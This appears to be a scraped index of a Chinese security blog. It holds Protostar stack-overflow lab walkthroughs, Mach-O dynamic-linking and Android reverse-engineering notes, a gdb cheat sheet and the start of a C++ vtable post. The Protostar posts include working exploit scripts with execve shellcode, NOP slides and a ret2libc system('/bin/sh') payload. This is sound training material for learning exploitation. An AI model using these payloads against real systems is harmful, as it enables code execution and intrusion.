&lt;getpath+27&gt;: call 0x80483b0 &lt;fflush@plt&gt; 0x080484a4 &lt;getpath+32&gt;: lea eax,[ebp-0x4c] 0x080484a7 &lt;getpath+35&gt;: mov DWORD PTR [esp],eax 0x080484aa &lt;getpath+38&gt;: call 0x8048380 &lt;gets@plt&gt; 0x080484af &lt;getpath+43&gt;: mov eax,DWORD PTR [ebp+0x4] 0x080484b2 &lt;getpath+46&gt;: mov DWORD PTR [ebp-0xc],eax 0x080484b5 &lt;getpath+49&gt;: mov eax,DWORD PTR [ebp-0xc] 0x080484b8 &lt;getpath+52&gt;: and eax,0xbf000000 0x080484bd &lt;getpath+57&gt;: cmp eax,0xbf000000 0x080484c2 &lt;getpath+62&gt;: jne 0x80484e4 &lt;getpath+96&gt; 0x080484c4 &lt;getpath+64&gt;: mov eax,0x80485e4 0x080484c9 &lt;getpath+69&gt;: mov edx,DWORD PTR [ebp-0xc] 0x080484cc &lt;getpath+72&gt;: mov DWORD PTR [esp+0x4],edx 0x080484d0 &lt;getpath+76&gt;: mov DWORD PTR [esp],eax 0x080484d3 &lt;getpath+79&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x080484d8 &lt;getpath+84&gt;: mov DWORD PTR [esp],0x1 0x080484df &lt;getpath+91&gt;: call 0x80483a0 &lt;_exit@plt&gt; 0x080484e4 &lt;getpath+96&gt;: mov eax,0x80485f0 0x080484e9 &lt;getpath+101&gt;: lea edx,[ebp-0x4c] 0x080484ec &lt;getpath+104&gt;: mov DWORD PTR [esp+0x4],edx 0x080484f0 &lt;getpath+108&gt;: mov DWORD PTR [esp],eax 0x080484f3 &lt;getpath+111&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x080484f8 &lt;getpath+116&gt;: leave 0x080484f9 &lt;getpath+117&gt;: ret 调试&amp;hack测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。 import struct padding = &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39; ret = struct.pack(&quot;I&quot;, 0x080484f9) eip_after_ret = struct.pack(&quot;I&quot;, 0xbffff78c+40) nopslide = &#39;\\x90&#39;*100 payload = &#39;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80&#39; print padding+ret+eip_after_ret+nopslide+payload 这里的ret返回地址我们改为了0x080484f9正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。 here we go! 成功运行bash！ 0x04 Ret2libc这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用system(&quot;/bin/sh&quot;)。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串&quot;/bin/sh&quot;压入栈中。下面我们就来做两件事： * 1，找到system在内存中的地址 * 2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址 system &amp; &quot;/bin/sh&quot; 先找到/lib/libc-2.11.2.so在内存中的位置 然后找到字符串&quot;/bin/sh&quot;在/lib/libc-2.11.2.so中的偏移 验证：所以&quot;/bin/sh&quot;为0xb7fb63bf hack编写对应的Python脚本 import struct padding = &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39; system = struct.pack(&quot;I&quot;,0xb7ecffb0) #system地址 ret_after_system = &#39;AAAA&#39; #返回地址，不重要 bin_sh = struct.pack(&quot;I&quot;, 0xb7fb63bf) #参数/bin/sh地址 print padding+system+ret_after_system+bin_sh 测试 cooooool! make it!0x05 小结学习到现在，一句话总结就是：你知道得越多才知道知道得越少。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-ret跳转到自定义shellcode","date":"2017-04-15T03:12:19.000Z","path":"2017/04/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/","text":"0x00 序 经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分析。这次我们来做点有趣的事，我们引入shellcode。 0x01 C语言源代码Stack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints:At this point in time, it might be easier to use someone elses shellcodeIf debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debuggerremove the int3s once your shellcode is done. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 0x02 思路&amp;分析和前面的一样，我们可以通过覆盖返回地址然后由ret指令跳转到目标地址，但这次我们没有了win()函数，那我们应该跳转到哪里呢？没错，还是跳到栈上。要达到执行代码的目的，所以我们需要在栈上写入shellcode。Here we go！ 0x03 调试&amp;hack 对应汇编，我们在0x080483da &lt;main+22&gt;: ret处下个断点 (gdb) disassemble Dump of assembler code for function main: 0x080483c4 &lt;main+0&gt;: push %ebp 0x080483c5 &lt;main+1&gt;: mov %esp,%ebp 0x080483c7 &lt;main+3&gt;: and $0xfffffff0,%esp 0x080483ca &lt;main+6&gt;: sub $0x50,%esp 0x080483cd &lt;main+9&gt;: lea 0x10(%esp),%eax 0x080483d1 &lt;main+13&gt;: mov %eax,(%esp) 0x080483d4 &lt;main+16&gt;: call 0x80482e8 &lt;gets@plt&gt; 0x080483d9 &lt;main+21&gt;: leave 0x080483da &lt;main+22&gt;: ret 同样的方法，Python脚本测试返回地址 可以发现0xbffff79c处正是返回地址，对应到TTTT,我需要在TTTT处写上我们要跳转的地址。 既然题目中说了用int 3 cc指令那我们就先来测试下–[cc指令（见文章末尾）]我们成功执行了cc INT 3指令并触发 SIGTRAP 引入nop slide为什么需要nop slide?来看看这种情况，我们再启动一个终端去调试。发现地址里面内容一样，但地址却不同，为什么会这样呢？再看看整个栈的情况可以发现，在圈中之后的栈地址都相同，但由于工作路径不同，导致前面的栈地址都发生了变化。因此，我们需要引入nop slide去解决这种情况。 填写shellcode自此，我们可以加入我们的shellcode了。这里我用的这里的shellcode。 现在我们重新编写Python脚本，制作shellcode payload 我们已经跳转的地址已经变化了40字节，并加入100的nopslide偏移，然后再执行shellcode 运行测试的确执行了dash，但并没有出现运行结果，这里很容易困惑。不应该这样的啊？经过思考，原来我们执行了/bin/dash后，并没有输入任何数据，所以就退出了。 那怎么才能让执行后输入数据呢？这里有一个小技巧，在执行后用cat指令，将输入转到输出 so cool! make it!0x04 附录INT 3 CC 详细分分析可以看这边文章int 3中断与软件调试 简单的理解就是:当我们调试程序时，可以在可能有问题的地方插入一条INT 3指令，使CPU执行到这一点时停下来。这便是软件调试中经常用到的断点（breakpoint）功能，因此INT 3指令又被称为断点指令。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip","date":"2017-04-13T03:12:19.000Z","path":"2017/04/13/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 1/","text":"0x00 序 接着之前的系列，下面研究两种控制eip的方式 0x01 C语言源代码Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP) Hints:both gdb and objdump is your friend you determining where the win() function lies in memory. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(&quot;calling function pointer, jumping to 0x%08x\\n&quot;, fp); fp(); } } 在main函数下断点，分析可知，1处为fp的地址，2处为fp()的调用，我们需要覆盖掉esp+0x5c处所存的函数指针值，使其跳转到win()函数 利用Python编写exp测试脚本，可以发现QQQQ覆盖了函数指针 重新编写exp,将QQQQ改为win()函数的地址，即可实现自定义调用，控制eip 成功执行win()函数 0x02 通过ret指令控制eipStack4 takes a look at overwriting saved EIP and standard buffer overflows. This level is at /opt/protostar/bin/stack4 Hints:A variety of introductory papers into buffer overflows may help.gdb lets you do “run &lt; input”EIP is not directly after the end of buffer, compiler padding can also increase the size. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 先分析一下，可以发现这个程序很简单，看上去没有可以直接控制eip的方法，但函数的调用过程在结束的时候会将保存的返回地址存在栈中，ret指令的时候会将传给eip。所以我们可以覆盖对应的返回地址值达到控制eip ______________ | | &lt;---esp -------------- | 局部变量1 | -------------- | 局部变量2 | -------------- | ... | -------------- | | &lt;---new ebp -------------- | old ebp | -------------- | 返回地址 | ret --------&gt; eip -------------- 和前面一样，这次我们之间利用Python编写exp测试脚本，可以发现SSSS覆盖了old ebp，TTTT覆盖了返回地址 我们查看win()的地址，重新编写对应exp，然后将TTTT改为其地址，成功达到目的。 成功执行win()函数","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-简单栈溢出修改局部变量值","date":"2017-04-11T03:12:19.000Z","path":"2017/04/11/Protostar-栈溢出系列学习-Stack 0/Protostar-栈溢出系列学习-Stack 0/","text":"0x01 序 为了加强自己在漏洞利用方面的能力，准备做一个栈溢出和堆溢出利用的系列学习，从最简单的栈溢出学习开始，学习平台是本地搭建的一个基于linux系统的Protostar学习虚拟机环境，里面有从易到难的示例溢出漏洞程序。那就开始吧！ 0x01 Protostar虚拟机环境搭建虚拟机下载地址 虚拟机环境搭建视频教程 默认用户名和密码: user:user root:godmode 虚拟机启动后，输入bash进入终端界面 漏洞程序在/opt/protostar/bin目录下 0x01 C语言源代码This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution. This level is at /opt/protostar/bin/stack0 #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&quot;you have changed the &#39;modified&#39; variable\\n&quot;); } else { printf(&quot;Try again?\\n&quot;); } } 0x02 思路&amp;分析这个栈溢出很简单，首先在栈上分配了64字节大小的空间，然后根据modified的值来决定执行流程，但modified始终等于0。所以我们需要利用栈溢出去修改modified的值。 0x03 调试&amp;利用 gdb连接到stack0，下break *main在main函数上下断点，然后set disassembly-flavor intel设置intel汇编指令格式,在0x08048411出下个断点 利用define hook-stop在断点触发时观察栈变量和寄存器的值 &gt;info registers &gt;x/24wx $esp &gt;end 由上图可以发现，当我们输入几个A后，0xbffff762地址已经被写入了0x41,然后我们再查看modified的值发现没有变化，通过计算发现为buffer偏移4+16*3+12字节出。 利用Python写入4+16*3+14字节数的A，发现成功修改modified的值，改变其执行流程。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Mach-o动态链接","date":"2017-04-10T03:12:19.000Z","path":"2017/04/10/macho-dyld-link/macho-dyld-link/","text":"0x00 序可执行文件很少是独立的，除了极少数的一些静态链接的可执行文件以外，大多的都是动态链接，这就需要依赖一些预先存在的库，这些库可以是操作系统提供的动态共享库，也可以是第三方的库。所以在可执行文件中充满了大量对外部库的符号的引用，这些空洞就需要动态链接器来完成所谓的符号绑定。macOS中是内核执行LC_DYLINKER加载命令时启动的，通常为/usr/lib/dyld接管刚创建进程的控制权。本文就来分析其符号的动态链接过程。 0x01 符号的加载过程以下面这个简单的C语言程序为例。 void main(int argc, char *argv[]) { printf(&quot;first printf&quot;); printf(&quot;second printf&quot;); } 对应的汇编代码 -&gt; 0x100000f40 &lt;+0&gt;: pushq %rbp 0x100000f41 &lt;+1&gt;: movq %rsp, %rbp 0x100000f44 &lt;+4&gt;: subq $0x20, %rsp 0x100000f48 &lt;+8&gt;: leaq 0x4b(%rip), %rax ; &quot;first printf&quot; 0x100000f4f &lt;+15&gt;: movl %edi, -0x4(%rbp) 0x100000f52 &lt;+18&gt;: movq %rsi, -0x10(%rbp) 0x100000f56 &lt;+22&gt;: movq %rax, %rdi 0x100000f59 &lt;+25&gt;: movb $0x0, %al 0x100000f5b &lt;+27&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f60 &lt;+32&gt;: leaq 0x40(%rip), %rdi ; &quot;second printf&quot; 0x100000f67 &lt;+39&gt;: movl %eax, -0x14(%rbp) 0x100000f6a &lt;+42&gt;: movb $0x0, %al 0x100000f6c &lt;+44&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f71 &lt;+49&gt;: movl %eax, -0x18(%rbp) 0x100000f74 &lt;+52&gt;: addq $0x20, %rsp 0x100000f78 &lt;+56&gt;: popq %rbp 0x100000f79 &lt;+57&gt;: retq 和大多数的Linux系统一样，mach-o符号的动态绑定也采用了打桩机制，简单的说就是在遇到外部符号的时候就会先跳转到stub区 第一次printf会先进入dyld_stub_binder区去找到printf函数的地址，我们用lldb调试观察DATA段la_symbol_ptr区地址值 会发现正好地址在dyld_stub_binder区 验证: 第二次printf我们在观察DATA段la_symbol_ptr区地址值 我们会发现当第二次再次调用printf函数时，还是会先跳转到stub区，但此时la_symbol_ptr中的值却变为了printf的真实地址，而不是dyld_stub_binder。这样就完成了一次延时绑定，后面就直接调用。 0x02 stub桩机制总结综上分析，我们可以发现所有的外部函数引用都会在DATA段la_symbol_ptr区中产生一个占位符，其初始值为dyld_stub_binder区中对应的编号地址。当第一个调用时，就会进入符号的动态链接过程，一旦找到其地址后，就会将DATA段la_symbol_ptr区中的占位符改为找到后的地址。这样就完成了只需要一个符号绑定。 stub桩机制的巧妙之处也在此，首先当产生一个外部符号调用时，直接跳到对应的stub桩位置，然后由里面保存的地址来判断是第一次调用还是已经找到符号的地址。就像桩这个名字含义一样，一个占位符的思想。 0x03 参考Mach-O的动态链接相关知识 Dynamic Linking: ELF vs. Mach-O Dynamic symbol table duel: ELF vs Mach-O, round 2","tags":[{"name":"mach-o","slug":"mach-o","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/mach-o/"},{"name":"dyld","slug":"dyld","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/dyld/"},{"name":"stub","slug":"stub","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/stub/"}]},{"title":"android re basic","date":"2017-04-09T09:25:13.000Z","path":"2017/04/09/android-re-basic/android-re-basic/","text":"Android系统简介文件目录 目录 说明 /system/app 预装的app(.apk)文件，如Alarm Clock, Browser, Contacts, Maps /system/framework Android系统的核心库，有core.jar, framework-res.apk, com.google.android.gtalkservice.jar /data/app 用户安装的app(.apk)文件 /data/data/app-package-name Context.openFileOutput()创建的文件 adb使用介绍 命令 说明 adb devices 列举连接到电脑 adb push local remote 可以copy本机文件到手机 adb pull remote local 可以copy手机文件到本机 adb shell 获得shell adb install apk-file 安装 adb -s device-serialnum 指定某台设备 adb shell getprop ro.build.version.release 获取系统版本 adb shell getprop ro.build.version.sdk 获取系统api版本 adb -d 唯一指定连接的设备 adb -d shell getprop ro.product.cpu.abi 查看cpu型号 apk文件结构 文件或目录 说明 AndroidManifest.xml 一个清单文件，它描述了应用的名字、版本、权限、注册的服务等信息 assets文件夹 存放资源文件的目录 classes.dex java源码编译经过编译后生成的dalvik字节码文件，主要在Dalvik虚拟机上运行的主要代码部分 lib文件夹 存放ndk编译出来的so文件 META-INF文件夹 1.该目录下存放的是签名信息，用来保证apk包的完整性和系统的安全性 2.CERT.RS 保存着该应用程序的证书和授权信息 3.CERT.SF 保存着SHA-1信息资源列表 4.MANIFEST.MF 清单信息 res文件夹 存放资源文件的目录 resources.arsc 编译后的二进制资源文件 xposed安装手机端需要安装xposed框架 电脑端需要去https://jcenter.bintray.com/de/robv/android/xposed/api/下载依赖的jar包手动依赖，或者 compileOnly &#39;de.robv.android.xposed:api:82&#39;让gradle去自动下载依赖。这两种方式不能同时使用。不然会编译出来的apk不能被xposed框架加载。 将两个jar包放入libs目录下 在build.gradle文件中添加以下 dependencies { compileOnly &#39;de.robv.android.xposed:api:82&#39; implementation fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;]) implementation &#39;com.android.support:appcompat-v7:28.0.0&#39; implementation &#39;com.android.support.constraint:constraint-layout:1.1.3&#39; testImplementation &#39;junit:junit:4.12&#39; androidTestImplementation &#39;com.android.support.test:runner:1.0.2&#39; androidTestImplementation &#39;com.android.support.test.espresso:espresso-core:3.0.2&#39; } 禁用instant run AndroidManifest.xml中写入以下标识为xposed模块 &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot; /&gt; &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;desciption for the xposed module&quot; /&gt; &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;53&quot; /&gt; 创建assets文件夹并创建xposed_init的txt文件，里面按行写入hook类的全路径 com.xia0.crackmehooker.Hooks 使用public class Hooks implements IXposedHookLoadPackage { final String packageName = &quot;com.xia0.crackmehooker&quot;; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable { if (loadPackageParam.packageName.equals(packageName)) { XposedBridge.log(&quot;[xia0] ===================hook=============&quot;); Class clazz = loadPackageParam.classLoader.loadClass(&quot;com.xia0.crackmehooker.MainActivity&quot;); XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { param.setResult(&quot;you has been hooked&quot;); } }); } } } 代码很简单，无解释。 hook多dex或动态load的dexXposedHelpers.findAndHookMethod(ClassLoader.class, &quot;loadClass&quot;, String.class, new XC_MethodHook() { @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { if (param.hasThrowable()) return; Class&lt;?&gt; cls = (Class&lt;?&gt;) param.getResult(); String name = cls.getName(); if (name.contains(&quot;StringScriptSource&quot;)) { XposedBridge.log(&quot;[xia0]: load class &quot;+ name); XposedBridge.hookAllMethods(cls, &quot;getScript&quot;,new XC_MethodHook() { @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { // TODO super.afterHookedMethod(param); String ret = (String) param.getResult(); XposedBridge.log(&quot;[xia0]: hook result :\\n&quot;+ (String) ret); } } ); } } }); 原理就是hook classLoader的loadClass方法，然后再去hook目标class，这时候就能解决hook的时候class不存在的问题。 jni编程java文件 package com.xia0.jni; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.TextView; import android.widget.Toast; public class MainActivity extends AppCompatActivity { public TextView textview; public Button button; static { System.loadLibrary(&quot;ndktest&quot;); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); this.button = (Button) findViewById(R.id.button); this.textview = (TextView) findViewById(R.id.text); button.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { Toast.makeText(MainActivity.this, stringFromJni(), Toast.LENGTH_SHORT).show(); textview.setText(stringFromJni()); } }); } public native String stringFromJni(); } C++文件 native.h #ifndef NDK_CORE_H #define NDK_CORE_H #define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0]))) #include &lt;jni.h&gt; #include &lt;stdlib.h&gt; __BEGIN_DECLS JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved); JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved); __END_DECLS #endif //TEXT_HELLO_H native.cpp #include &quot;native.h&quot; jstring returnString(JNIEnv *env,jobject jobj){ char* str = &quot;I come from C＋＋&quot;; return env-&gt;NewStringUTF(str); } static JNINativeMethod gMethods[] = { {&quot;stringFromJni&quot;,&quot;()Ljava/lang/String;&quot;,(void *)returnString } }; JNIEXPORT int JNICALL JNI_OnLoad(JavaVM *vm,void *reserved) { JNIEnv *env; if (vm-&gt;GetEnv((void **) &amp;env,JNI_VERSION_1_6) != JNI_OK){ return JNI_ERR; } jclass javaClass = env-&gt;FindClass(&quot;com/xia0/jni/MainActivity&quot;); if (javaClass == NULL){ return JNI_ERR; } if (env-&gt;RegisterNatives(javaClass,gMethods,NELEM(gMethods)) &lt; 0) { return JNI_ERR; } return JNI_VERSION_1_6; } Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) LOCAL_MODULE := ndktest LOCAL_C_INCLUDES += $(LOCAL_PATH) LOCAL_SRC_FILES := native.cpp include $(BUILD_SHARED_LIBRARY) Application.mk APP_ABI := armeabi-v7a x86 APP_PLATFORM := android-16 APP_STL := c++_shared APP_OPTIM := debug 打开terminal，cd src/main/jni文件夹中，然后执行ndk-build 在项目名称的右键点击Link C++ Project with Gradle ，选择ndk-build，指定Android.mk文件路径 java 符号 c++ boolean Z jboolean byte B jbyte char C jchar short S jshort int I jint long J jlong float F jfloat double D jdouble void V objects对象 Lfully-qualified-class-name; jobject Arrays数组 [array-type jintArray 重打包签名生成keystore keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 签名apk jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name 验证签名 jarsigner -verify -verbose -certs my_application.apk zip zipalign -v 4 your_project_name-unaligned.apk your_project_name.apk 调试 jdb 在AndroidManifest.xml的application中添加android:debuggable=&quot;true&quot; mprop BDOpener 参考 adb shell am start -D -n com.test.id/.MainActivity adb -d forward tcp:29882 jdwp:app_pid jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=29882 ida adb push dbgsrv/android_server /data/local/tmp ./android_server adb forward tcp:23946 tcp:23946 lldb platform select remote-android adb push lldb-server /data/local/tmp/ adb shell /data/local/tmp/lldb-server platform --server --listen unix-abstract:///data/local/tmp/debug.sock platform select remote-android platform connect unix-abstract-connect:///data/local/tmp/debug.sock 刷机/root/xposedUnlock bootloaderhttps://developers.google.com/android/images下载google原生镜像 adb reboot bootloader fastboot flashing unlock fastboot reboot fastboot boot twrp-3.2.3-0-blueline.img // boot TWRP 注意点： 在安装TWRP应用的时候不要安装为系统应用 参考https://www.thecustomdroid.com/root-google-pixel-3-xl-guide/ xposed框架https://github.com/ElderDrivers/EdXposed 常见资源/索引 平台代号、版本、API 级别和 NDK 版本 https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/","tags":[{"name":"android","slug":"android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"}]},{"title":"gdb常用调试命令总结","date":"2017-03-21T03:06:59.000Z","path":"2017/03/21/gdb常用调试命令总结/gdb/","text":"0x01 序最近在做TCTF上一道Linux下的逆向题，对GDB的调试很多命令相关做一个小总结，可能不是很系统，只是记一些比较常用的，后面可能会不定期更新。 0x02 命令行参数有时候，我们需要调试的程序需要有命令行参数，很多朋友都不知道怎么设置调试的程序的命令行参数。其实，有两种方法： gdb命令行的 –args 参数 gdb环境中 set args命令 show args查看程序参数 0x03 多线程调试多线程调试可能是问得最多的。其实，重要就是下面几个命令： info thread 查看当前进程的线程。thread 切换调试的线程为指定ID的线程。break file.c:100 thread all 在file.c文件第100行处为所有经过这里的线程设置断点。set scheduler-locking off|on|step，这个是问得最多的。在使用step或者continue命令调试当前被调试线程的时候，其他线程也是同时执行的，怎么只让被调试程序执行呢？通过这个命令就可以实现这个需求。 off 不锁定任何线程，也就是所有线程都执行，这是默认值。 on 只有当前被调试程序会执行。 step 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行。 0x04 断点 break *0x000000 下断点 info breakpoints 查看断点 delete break 1 删除断点 break [where] if [condition] 条件断点 enable 恢复失效的断点 disable 使断点失效 clear 清除断点 break 21 在第21行设置断点 break main 在main函数处设置断点 break test 在函数test处设置断点 0x05 x命令也许，你很喜欢用p命令。所以，当你不知道变量名的时候，你可能会手足无措，因为p命令总是需要一个变量名的。x命令是用来查看内存的，在gdb中 “help x” 你可以查看其帮助。 x/x 以十六进制输出 x/d 以十进制输出 x/c 以单字符输出 x/i 反汇编 – 通常，我们会使用 x/10i $ip-20 来查看当前的汇编（$ip是指令寄存器） x/s 以字符串输出 x/5i $pc 查看汇编代码 x/4wx 0x000000 查看内存 0x06 command命令有一些朋友问我如何自动化调试。这里向大家介绍command命令，简单的理解一下，其就是把一组gdb的命令打包，有点像字处理软件的“宏”。下面是一个示例： (gdb) break func Breakpoint 1 at 0x3475678: file test.c, line 12. (gdb) command 1 Type commands for when breakpoint 1 is hit, one per line. End with a line saying just &quot;end&quot;. &gt;print arg1 &gt;print arg2 &gt;print arg3 &gt;end (gdb) 当我们的断点到达时，自动执行command中的三个命令，把func的三个参数值打出来。 0x07 其他 step / s 下一步，直接执行下一条程序 set disassembly-flavor intel 设置为intel汇编指令 info proc mappings `define stop-hook 设置断点触发后自动执行命令 info registersx/24wx $espx/2i $eipend` continue / cont 下一段，如果遇到函数，不会进入函数，逐过程，有点类似VS里面的F10 run 运行 finish 结束调试 print / p 显示某个变量的值 p *array@len 输出数组 p i 输出i的值 0x08 附表寄存器宽度表 |63..32|31..16|15-8|7-0| |AH.|AL.| |AX.....| |EAX............| |RAX...................|","tags":[{"name":"gdb","slug":"gdb","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/gdb/"},{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"}]},{"title":"详解virtual table","date":"2017-03-06T17:51:44.000Z","path":"2017/03/07/C++ Virtual table/详解virtual table/","text":"详解virtual tableC++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。 关于虚函数的使用方法，我在这里不做过多的阐述。大家可以看看相关的C++的书籍。在这篇文章中，我只想从虚函数的实现机制上面为大家 一个清晰的剖析。 当然，相同的文章在网上也出现过一些了，但我总感觉这些文章不是很容易阅读，大段大段的代码，没有图片，没有详细的说明，没有比较，没有举一反三。不利于学习和阅读，所以这是我想写下这篇文章的原因。也希望大家多给我提意见。 言归正传，让我们一起进入虚函数的世界。 虚函数表 对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。 在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了 这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。 这里我们着重看一下这张虚函数表。在C++的标准规格说明书中说到，编译器必需要保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证正确取到虚函数的偏移量）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。 听我扯了那么多，我可以感觉出来你现在可能比以前更加晕头转向了。 没关系，下面就是实际的例子，相信聪明的你一看就明白了。 假设我们有这样的一个类： class Base { public: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } virtual void g() { cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; } virtual void h() { cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; } }; 按照上面的说法，我们可以通过Base的实例来得到虚函数表。 下面是实际例程： typedef void(*Fun)(void); Base b; Fun pFun = NULL; cout &lt;&lt; &quot;虚函数表地址：&quot; &lt;&lt; (int*)(&amp;b) &lt;&lt; endl; cout &lt;&lt; &quot;虚函数表 — 第一个函数地址：&quot; &lt;&lt; (int*)*(int*)(&amp;b) &lt;&lt; endl; // Invoke the first virtual function pFun = (Fun)*((int*)*(int*)(&amp;b)); pFun(); 实际运行经果如下：(Windows XP+VS2003, Linux 2.6.22 + GCC 4.1.3) 虚函数表地址：0012FED4 虚函数表 — 第一个函数地址：0044F148 Base::f 通过这个示例，我们可以看到，我们可以通过强行把&amp;b转成int 